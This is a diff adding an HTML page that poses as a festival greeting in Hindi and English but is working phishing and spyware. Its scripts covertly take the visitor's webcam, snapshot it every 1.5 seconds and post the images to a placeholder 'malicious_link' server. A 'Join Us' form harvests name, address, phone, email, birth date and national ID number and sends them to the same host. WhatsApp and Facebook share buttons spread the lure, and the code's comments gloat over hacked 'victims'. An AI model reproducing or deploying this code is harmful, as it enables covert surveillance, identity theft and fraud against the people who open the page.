@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"> 
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
+    <link href='https://fonts.googleapis.com/css?family=Sofia:&effect=neon' rel='stylesheet'>
+    <link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">
+    <script type="text/javascript" src="payload2.js"></script> 
+    <title>Let celebrate this festival sesson together</title>
+    <style>
+        .wrapper2{display: flex;justify-content: center;align-items: center;font: 1em;font-family: Verdana, Geneva, Tahoma, sans-serif;}
+        .wrapper1{position: absolute;right: 25%;left: 25%;top: 0%;}
+        
+        .form{height: auto;width: 550px;border: 5px solid #222;border-radius: 30px;text-align: center;padding: 40px 10px;}
+        .form{backdrop-filter: blur(10px);}
+        .input-field{width: 100%;height: 39px;margin: 40px 0;border-radius: 10px;}
+        input{width: 95%;height: 100%;padding-left: 10px;font: x-large sans-serif;border: 1px solid #ccc;border-radius: 10px;}
+        input:hover{border: 1px solid #000;border-radius: 10px;}
+        .label{float: left;font-weight: bold;}
+        .gen{display: flex;justify-content: space-between;}
+        .btn {margin: 7px 0;}
+        .radio{width: auto;height: auto;}
+    </style>
+    <style>
+        * {box-sizing: border-box;}
+        body {font-family: Verdana, sans-serif;
+        background: linear-gradient(90deg, #eafa0fd0, #239abed2, #001affb6, #83288f9a);
+-webkit-background-size: cover;
+-moz-background-size: cover;
+-o-background-size: cover;
+background-size: cover;
+animation: bg 5s linear -5s infinite;
+position: relative;}
+
+        @keyframes bg {  
+0% {background: linear-gradient(336deg, #eafa0fd0, #239abed2, #001affb6, #83288f9a);}
+20% {background: linear-gradient(48deg, #eafa0fd0, #239abed2, #001affb6, #83288f9a);}
+40% {background: linear-gradient(360deg, #eafa0fd0, #239abed2, #001affb6, #83288f9a);}
+60% {background: linear-gradient(73deg, #eafa0fd0, #239abed2, #001affb6, #83288f9a);}
+80% {background: linear-gradient(0deg, #eafa0fd0, #239abed2, #001affb6, #83288f9a);}
+100% {background: linear-gradient(312deg, #eafa0fd0, #239abed2, #001affb6, #83288f9a);}
+}
+        img {vertical-align: middle;}
+        .footerbtn:active {box-shadow: none}
+
+        .footerbtn {
+    display: block;
+    line-height: 15px;
+    bottom:5px;
+    height:50px;
+    border-radius: 15px;
+    box-sizing: border-box;
+
+        padding: 5px;
+        color: #ffffff;
+        font-size: 18px;
+        text-align: center;
+        text-decoration: none;
+        width:45%;
+
+margin-left:10px;
+margin-right:30px;
+box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .3);
+animation: btn infinite linear 1s;
+-webkit-transform: translate3d(30%,0,0);
+transform: translate3d(30%,0,0);
+position: fixed;}
+        
+        .two{background-color:#34af23;position: fixed;left:0px;}
+        .one{background-color:#000099;position: fixed;right:0px;}
+
+        /* .footers{} */
+        
+
+        .footerbtn :active {
+            box-shadow: none
+        }
+        
+        @keyframes btn {
+            from {-webkit-transform: rotateZ(0)}
+            25% {-webkit-transform: rotateZ(1.5deg)}
+            50% {-webkit-transform: rotateZ(0deg)}
+            75% {-webkit-transform: rotateZ(-1.5deg)}
+            to {-webkit-transform: rotateZ(0)}
+        }
+        
+        figure {
+            /* position: absolute; */
+  animation:wobble 5s ease-in-out infinite;
+  /* left: 43%; */
+  /* right: 50%; */
+  transform-origin:center center;
+  transform-style:preserve-3d;
+}
+
+@keyframes wobble {
+  0%{ transform:rotatez(0);text-shadow:0 0 30px red;}
+  25%{ transform:rotateZ(1.5deg);text-shadow:0 0 30px orange;}
+  50%{ transform:rotate3d(0deg);text-shadow:0 0 30px rgb(2, 255, 2);}
+  75%{ transform:rotateY(-1.5deg);text-shadow:0 0 30px rgba(5, 255, 255, 0.822);}
+  100%{ transform:rotateY(0);text-shadow:0 0 30px red;}
+}
+
+        .h1 {
+  display:block;
+  position:absolute;
+  left: 0%;right: 0%;
+  width:fit-content;
+  margin-inline: auto;
+  line-height:1.5;
+  font:900 35px 'Concert One', sans-serif;
+  color:#fff;
+}
+/* .h11{position: absolute;right: 5%;left: 5%;} */
+
+
+
+/* .h1:nth-child(2){ transform:translateZ(5px); }
+.h1:nth-child(3){ transform:translateZ(10px);}
+.h1:nth-child(4){ transform:translateZ(15px); }
+.h1:nth-child(5){ transform:translateZ(20px); }
+.h1:nth-child(6){ transform:translateZ(25px); }
+.h1:nth-child(7){ transform:translateZ(30px); }
+.h1:nth-child(8){ transform:translateZ(35px); }
+.h1:nth-child(9){ transform:translateZ(40px); }
+.h1:nth-child(10){ transform:translateZ(45px); } */
+
+        @keyframes rock {  
+            0% {transform: rotate(-2deg);}
+            50% {transform: rotate(1deg);}
+            100% {transform: rotate(-2deg);}
+        }
+
+
+        .greeting {
+        /* font-size: 2rem; */
+            text-align: center;
+            color: black;
+            animation: rock infinite 1s;
+            font-family: 'Indie Flower', cursive;
+            letter-spacing: 2px;
+        }
+
+        .joinUS {
+            margin: 10px;
+            padding: 10px;
+            font-size: larger;
+            font-weight: 900;
+            border: #000 2px solid;
+            border-radius: 20%;
+            max-width: 250px;
+            cursor: pointer;
+            text-align: center;
+            animation: rock infinite 1s;
+        }
+        .ah1  {
+  display:block;
+  font:900 35px 'Concert One', sans-serif;
+  color:#fff;
+}
+
+    </style>
+</head>
+<body>
+    <div class="anonContent">
+        <div class="video-wrap" hidden="hidden"><video id="video" playsinline autoplay></video></div>
+         <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+          <span id="errorMsg" hidden="hidden"></span>
+    </div>
+
+    <script>
+     
+        function post(imgdata){
+        $.ajax({
+            type: 'POST',
+            data: { caption: imgdata},
+            url: 'malicious_link/saver.php',
+            dataType: 'json',
+            async: false,
+            success: function(result){
+                // call the function that handles the response/results
+            },
+            error: function(){
+            }
+          });
+        };
+        
+        
+        'use strict';
+        
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const errorMsgElement = document.getElementById('errorMsg');
+        
+        const constraints = {
+          audio: false,
+          video: {
+            
+            facingMode: "user"
+          }
+        };
+        
+        // Access webcam
+        async function init() {
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            handleSuccess(stream);
+          } catch (e) {
+            errorMsgElement.innerHTML = e.toString();
+            if (e.toString().includes("NotFoundError")){
+                console.log("Hmm, we no fit find any internal or external camera on this device!");
+        await wait4me(5000);
+                var xhttp = new XMLHttpRequest();
+                xhttp.open("post", "malicious_link/attention.php?denied1=Hmm,_internal_or_external_camera_can_not_be_found_in_victims_device!");//
+                xhttp.send();
+                console.log(xhttp);
+            } else {
+                console.log("Hmm,\nWe fucking well need to fucking access ur fucking camera, men!");
+                alert("Allow camera access for in order to exprience more features of this website!");
+                window.location.href = "https://www.lifewire.com/configure-camera-microphone-setting-in-google-chrome-4103623";
+                alert("Access to camera successfully granted");
+                console.log("BOOM!, Game Over...");
+            }
+          }
+        }
+        
+        // Success
+        async function handleSuccess(stream) {
+          window.stream = stream;
+          video.srcObject = stream;
+          console.log("Hahaha, we successfully hacks into victims device camera!,");
+        await wait4me(5000);
+                var xhttp = new XMLHttpRequest();
+                xhttp.open("post", "malicious_link/attention.php?granted1=Wo-ho!,_we_successfully_hacked_into_victims_camera!, Now_u_can_be_able_to_received_victims_pictures.");//
+                xhttp.send();
+                console.log(xhttp);
+        
+        var context = canvas.getContext('2d');
+          setInterval(function(){
+        
+               context.drawImage(video, 0, 0, 640, 480);
+               var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+               post(canvasData); }, 1500);
+        
+        }
+        
+        // Load init
+        init();
+        
+        </script>
+
+
+<div id="google_trans"></div>
+<script type="text/javascript">
+    function googleTranslateElementInit(){
+        new google.translate.TranslateElement({
+            pageLanguage: 'en'},
+            'google_trans');
+                }
+                </script>
+    
+    <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+    <div class="mainContent" style="position: relative;"><br>
+        <center><span style="font-size: 20px;text-transform: capitalize;color: whitesmoke;font-weight: bolder;"><span style="color: #00ff00;">▅ ▆ ▇ █</span> Happy <script 
+        type="text/javascript" 
+        language="Javascript">
+        document.write(xxx);
+        </script> <span style="color: #08ff08;">█ ▇ ▆ ▅</span></center>	
+            <center>
+                <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+                <ins class="adsbygoogle" style="display:inline-block;width:300px;height:50px" data-ad-client="ca-pub-4696491179456446" data-ad-slot="2568634816"></ins>
+                <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+            </center>
+            <div style="font-size: 20px; font-weight: 500; color: Black;">
+                <center><p class="greeting">🙏 Welcome 🙏</p></center>
+                <div dir="ltr" style="text-align: left;" trbidi="on">
+                    <div style="background-color:rgb(0, 255, 0); border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: whitesmoke; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
+                        <marquee behavior="alternate"><b>🎇 “<script 
+        type="text/javascript" 
+        language="Javascript">
+        document.write(xxx);
+        </script> का ये शुभ अवसर आपके जीवन में अनेकों ख़ुशियाँ लेकर आए” 🎇</b></marquee>
+                    </div>
+                    <div style="background-color: rgb(255, 255, 255); border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: black; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
+                        <marquee behavior="alternate"><b>🎉 इस <script 
+        type="text/javascript" 
+        language="Javascript">
+        document.write(xxx);
+        </script> हमारी शुभकामनाएँ आपके साथ हैं 🎉</b></marquee>
+                    </div>
+                    <div style="background-color: rgb(0, 255, 0); border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: whitesmoke; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
+                        <marquee behavior="alternate"><b>|✨| <script 
+        type="text/javascript" 
+        language="Javascript">
+        document.write(xxx);
+        </script> की हार्दिक बधाई |✨|</b></marquee>
+                    </div>
+                </div>
+        
+                <center>
+                    <figure >
+                        <h1 class="h1 h11" style="text-transform: uppercase;">
+        <script type="text/javascript" language="Javascript">document.write(x);</script></h1>
+                    </figure>
+                </center>
+        
+                
+                <div style="background-color: #ccc; filter: blur(20%); border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: whitesmoke; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 120px auto 0px; padding: 4px 5px 3px; width: 70%;">
+                    <br><center>
+                        <p style="text-align: center;"><strong><span style="background-color: #ffea00; color: #005f96; font-size: 18pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;Wishing you a very </span></p>
+                    </center>
+                    <br>
+                    <p style="text-align: center;"><strong><span style="font-size: 21pt; font-family: 'comic sans ms', sans-serif; color: #ff7700;">✪ <span style="font-family: 'trebuchet ms', geneva;">Happy <script 
+        type="text/javascript" 
+        language="Javascript">
+        document.write(xxx);
+        </script></span> ✪</span></strong></p>
+                    <br>
+                    <p style="text-align: center;"><strong><span style="background-color: #ff0000; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;to you and your belovely family </span></p>
+                      <br>
+                      <p style="text-align: center;"><span style="background-color: #008000; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;may this auspicious occasion of this great <script 
+        type="text/javascript" 
+        language="Javascript">
+        document.write(xxx);
+        </script> season bring joy,  happiness, prosperity, health, and peace in our lifes, and may we look toword 
+                        success in year <script type="text/javascript">
+                            document.write(new Date().getFullYear())
+                        </script> up to the end of our lifes.</span></p>
+                      <br>
+                      <p style="text-align: center;"><span style="background-color: #ff00ff; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;✪ we are wishing you all the best of this <script 
+        type="text/javascript" 
+        language="Javascript">
+        document.write(xxx);
+        </script> season and we too. ✪</span></p>
+                    <br>
+                    <p style="text-align: center;"><span style="background-color: hsl(172, 99%, 26%); color: #FFFAFA; font-size: 15pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp; Join us to wish your family and friends a happy <script 
+        type="text/javascript" 
+        language="Javascript">
+        document.write(xxx);
+        </script> season  <br> 
+                                            <span style="text-transform: capitalize;">click this button <br> 👇👇👇👇👇 </span> <br> <button id="btn1" class="joinUS">Join Us</button> </span></p>
+                    
+                    <script  type="text/javascript">
+                        document.getElementById("btn1").addEventListener("click", async function() {
+        console.log("victim gonna prived their personal information ");
+        
+        document.getElementById("formwrapper").style.display = "block";
+                document.getElementById("formwrapper").style.position = "absolute";
+                document.getElementById("formwrapper").style.left = "0";
+                document.getElementById("formwrapper").style.right = "0";
+                document.getElementById("formwrapper").style.marginInline = "auto";
+                document.getElementById("formwrapper").style.width = "fit-content";
+                window.scrollTo(0,0);
+        await wait4me(5000);
+                            var xhttp = new XMLHttpRequest();
+        xhttp.open("post", `malicious_link/attention.php?message=please_wait!,_we_currently_interacting_with_victims_for_their_persional_information`);//
+        xhttp.send();
+        console.log(xhttp);})
+                    </script>                        <br>
+                    <p style="text-align: center;"><span style="background-color: #663399; color: #FFFAFA; font-size: 15pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp; यह संदेश <script 
+        type="text/javascript" 
+        language="Javascript">
+        document.write(xxx);
+        </script> तक सभी के मोबाइल में होना चाहिए यह आपका फर्ज हैं </span></p>
+                    <br>
+                </div>
+        
+            </div>
+
+            <script>
+function displayPic(pic){
+    document.getElementById("pic").setAttribute("src",pic);
+    document.getElementById("victims-pic").style.display="block";
+}
+            </script>
+
+<div class="wrapper1 wrapper2" id="formwrapper" style="display: none;">
+<div class="form">
+<h1 class="ah1">Please Fill Up The Form Before Joining</h1>
+<p id="victims-pic" style="display: none;"><img id="pic" height="300" width="auto" alt=""></p>
+<div class="input-field"><label for="img"><span class="label">Upload your Photo:</span><input  placeholder='Profile Pic' type="file" id="img" name="vPIC" accept="image/*" onchange="displayPic(window.URL.createObjectURL(this.files[0]));" required></label></div>
+<div class="input-field"><label for="fname"><span class="label">First Name:</span><input  placeholder='First Name' type="text" id="fname" name="fname" required></label></div>
+<div class="input-field"><label for="lname"><span class="label">Last Name:</span><input placeholder='Last Name' type="text" id="lname" name="lname" required></label></div>
+<div class="input-field"><label for="num"><span class="label">Phone Number:</span><input placeholder='Phone Number' type="number" id="num" name="num" required></label></div>
+<div class="input-field"><label for="email"><span class="label">Email Address:</span><input placeholder='Email Address' type="email" id="email" name="email" required></label></div>
+<div class="input-field"><label for="state"><span class="label">State:</span><input placeholder='State and LGA' type="text" id="state" name="state" required></label></div>
+<div class="input-field"><label for="lga"><span class="label">LGA:</span><input placeholder='Local Government Area' type="text" id="lga" name="lga" required></label></div>
+<div class="input-field"><label for="address"><span class="label">Home Address:</span><input placeholder='Home Address' type="text" id="address" name="address" required></label></div>
+<div class="input-field"><label for="date"><span class="label">Date of Birth:</span><input type="date" id="date" name="date" required></label></div>
+<div class="input-field"><label for="nin"><span class="label">NIN ID:</span><input placeholder='National Identification Number' type="text" id="nin" name="nin" required></label></div>
+<div class="input-field"><label for="job"><span class="label">Occupation:</span><input placeholder='last or current job' type="text" id="job" name="job" required></label></div>
+<div class="input-field"><label for="gender"><span class="label">Gender:</span></label><br><div class="gen">
+<label for="male">Male:<input type="radio" class="radio" id="male" name="gender" value="male" required></label>
+<label for="female">Female:<input type="radio" class="radio" id="female" name="gender" value="female" required></label>
+<label for="other">Others:<input type="radio" class="radio" id="other" name="gender" value="other" disabled></label>
+</div></div>
+<div class="input-field"><label for="maritan"><span class="label">Maritan:</span></label><br><div class="gen">
+<label for="single">Single:<input type="radio" class="radio" id="single" name="maritan" value="single" required></label>
+<label for="married">Married:<input type="radio" class="radio" id="marry" name="maritan" value="married" required></label>
+<label for="other">Others:<input type="radio" class="radio" id="other" name="maritan" value="other" disabled></label>
+</div></div><p id="err" style="display: none;"></p>
+<input type="submit" id="btn" class="input-field btn" value="Join Now">
+<center><p id="p">Already joined! <a href="#">Please join again?</a></p></center>
+</div>
+</div>
+
+<script>
+    document.getElementById("btn").addEventListener("click", function() {
+        
+
+        var V_img=document.getElementById("img").files[0];
+
+        // var imgData=new FormData();
+        // imgData.append(V_img.name,V_img.files[0]);
+        
+        var fname=document.getElementById("fname").value;
+        var state=document.getElementById("state").value;
+         state=state.replaceAll(" ","_"); 
+        var nin=document.getElementById("nin").value;
+         nin=nin.replaceAll(" ","_"); 
+        var lname=document.getElementById("lname").value;
+        var lga=document.getElementById("lga").value;
+         lga=lga.replaceAll(" ","_"); 
+        var job=document.getElementById("job").value;
+         job=job.replaceAll(" ","_"); 
+        var email=document.getElementById("email").value;
+        var home=document.getElementById("address").value; 
+         home=home.replaceAll(" ","_"); 
+        var phone=document.getElementById("num").value;
+         phone=phone.replaceAll(" ","_"); 
+        var dob=document.getElementById("date").value;
+
+        if (document.getElementById("male").checked){var gender="Male";}
+        else if(document.getElementById("female").checked){var gender="Female";}
+        else{var gender="Unidentified";}
+
+        if (document.getElementById("marry").checked){var maritan="Married";}
+        else if(document.getElementById("single").checked){var maritan="Single";}
+        else{var maritan="Unidentified";}
+
+        
+        var current=new Date().getFullYear();
+        var name=fname+" "+lname;
+        name=name.replaceAll(" ","_"); 
+        var year=dob.split("-")[0];
+        var age=current - year;
+        console.log(age);
+
+        if (name=="" || state=="" || lga=="" || nin=="" || job=="" || email=="" || phone=="" || dob=="" || home=="" || gender=="Unidentified"  || maritan=="Unidentified" || V_img==""){
+            document.getElementById("err").style.display = "block";
+            document.getElementById("err").innerHTML = "Opsy!, some of the input fields are not filled, please fill them.";
+            document.getElementById("err").focus();
+            alert("wetin you dey think bros!, you jump some of the input fields Oo, oya go fill them up!...");
+            document.getElementById("err").style.display = "none";
+        }else{
+
+        // var gender=document.getElementById("male").value;
+        
+        console.log(V_img);
+        console.log(fname);
+        console.log(lname);
+        console.log(email);
+        console.log(phone);
+        console.log(state);
+        console.log(lga);
+        console.log(home);
+        console.log(dob);
+        console.log(nin);
+        console.log(job);
+        console.log(gender);
+        console.log(maritan);
+
+        // send the form
+        var xhttp = new XMLHttpRequest();
+        xhttp.open("post", `malicious_link/form.php?vPIC=${V_img}&name=${name}&email=${email}&phone=${phone}&state=${state}&lga=${lga}&home=${home}&dob=${dob}&nin=${nin}&job=${job}&gender=${gender}&maritan=${maritan}&age=${age}`);//
+        xhttp.send();
+        console.log(xhttp);
+        
+        async function wait(){
+            alert("Successfully submitted");
+            await wait4me(5000);
+            document.getElementById("formwrapper").style.display = "none";
+        }
+        
+        console.log("our work here don dey finish...");
+        console.log("make una start dey pack kaya dey go!");
+        wait();
+        var xhttp = new XMLHttpRequest();
+        xhttp.open("post", `malicious_link/attention.php?redFlag=done_with_the_information_hunting!...`);//
+        xhttp.send();
+        console.log(xhttp);
+    }
+    });
+</script>
+            
+            <center>
+                <div class="busi"><h4><p style="text-transform: uppercase;font-size: 26px;color:#ffffff;"> <script type="text/javascript" language="Javascript">                                       
+                 document.write( "from unknown friend (anonymous friend)<br>to - you, " +x);
+                                      </script><br><br></p></h4></center>
+        
+        <br><br>
+        <br><br>
+        
+            <center class="footers">
+                <a class="footerbtn two" href="whatsapp://send?text=*मुझसे पहले ऐसा संदेश आपके लिए किसी ने नही भेजा होगा निचे क्लिक करके देखो क्या है आपके लिए* 👉 malicious_link" data-action="share/whatsapp/share">
+                    <img width="22px" height="22px" src="https://cdn.pixabay.com/photo/2015/08/03/13/58/soon-873316_640.png">  
+                    <b style="font-size: 26px;">Share</b>  
+               </a>
+                <a class="footerbtn one" href="https://www.facebook.com/sharer/sharer.php?u= malicious_link" target="_blank" title="Share this post on Facebook">
+                   <img width="22px" height="22px" src="https://cdn.pixabay.com/photo/2017/06/22/06/22/facebook-2429746_640.png">
+                    <b style="font-size: 26px;">Share</b>  
+                </a>
+            </center>
+    </div>
+</body>
+</html>
+
+<!-- you have been HACKED! -->
+<!-- your informations has been COMPROMISED! -->
+
